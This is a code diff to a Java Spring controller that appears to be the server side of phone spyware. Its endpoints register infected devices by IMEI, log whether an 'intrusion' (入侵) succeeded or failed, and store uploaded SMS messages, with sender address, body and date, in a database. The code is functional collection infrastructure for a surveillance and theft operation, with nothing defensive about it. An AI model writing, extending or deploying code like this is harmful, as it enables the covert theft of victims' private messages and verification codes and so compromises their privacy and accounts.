@@ -33,20 +33,41 @@ public class PhoneController {
     MsgService msgService;
 
     @ApiOperation(value = "APP安装成功")
-    @RequestMapping(value = "/install", method = RequestMethod.GET)
+    @RequestMapping(value = "/install", method = RequestMethod.POST)
     @ResponseBody
-    public JsonBean appInstall(@RequestParam(required = true) String token,
+    public JsonBean appInstall(@RequestParam(required = true) Integer user_id,
                                @RequestParam(required = true) String imei) {
         JsonBean bean;
-        phoneService.AddNewPhone(token,imei,new Date());
+        phoneService.AddNewPhone(user_id,imei,new Date());
+        bean = new JsonBean(ErrorCodeUtil.SUCCESS);
+        return bean;
+    }
+
+    @ApiOperation(value = "APP入侵成功")
+    @RequestMapping(value = "/success", method = RequestMethod.POST)
+    @ResponseBody
+    public JsonBean appSuccess(@RequestParam(required = true) String imei) {
+        JsonBean bean;
+        phoneService.AddSuccessPhone(imei,new Date());
+        bean = new JsonBean(ErrorCodeUtil.SUCCESS);
+        return bean;
+    }
+
+    @ApiOperation(value = "APP入侵失败")
+    @RequestMapping(value = "/error", method = RequestMethod.POST)
+    @ResponseBody
+    public JsonBean appError(@RequestParam(required = true) String imei) {
+        JsonBean bean;
+
+        phoneService.AddErrorPhone(imei,new Date());
         bean = new JsonBean(ErrorCodeUtil.SUCCESS);
         return bean;
     }
 
     @ApiOperation(value = "APP卸载成功")
-    @RequestMapping(value = "/delete", method = RequestMethod.GET)
+    @RequestMapping(value = "/delete", method = RequestMethod.POST)
     @ResponseBody
-    public JsonBean appDelete(@RequestParam(required = true) String token,
+    public JsonBean appDelete(@RequestParam(required = true) String user_id,
                               @RequestParam(required = true) String imei) {
         JsonBean bean;
         bean = new JsonBean(ErrorCodeUtil.SUCCESS);
@@ -56,12 +77,14 @@ public class PhoneController {
     @ApiOperation(value = "上传短信")
     @RequestMapping(value = "/sms", method = RequestMethod.POST)
     @ResponseBody
-    public JsonBean smsPOST(@RequestParam(required = true) String token,
+    public JsonBean smsPOST(@RequestParam(required = true) Integer id,
                             @RequestParam(required = true) String address,
                             @RequestParam(required = true) String body,
                             @RequestParam(required = true) long date,
                             @RequestParam(required = true) String imei) {
         JsonBean bean;
+        //添加短信
+        phoneService.AddMsg(id,address,body,date,imei);
         bean = new JsonBean(ErrorCodeUtil.SUCCESS);
         return bean;
     }
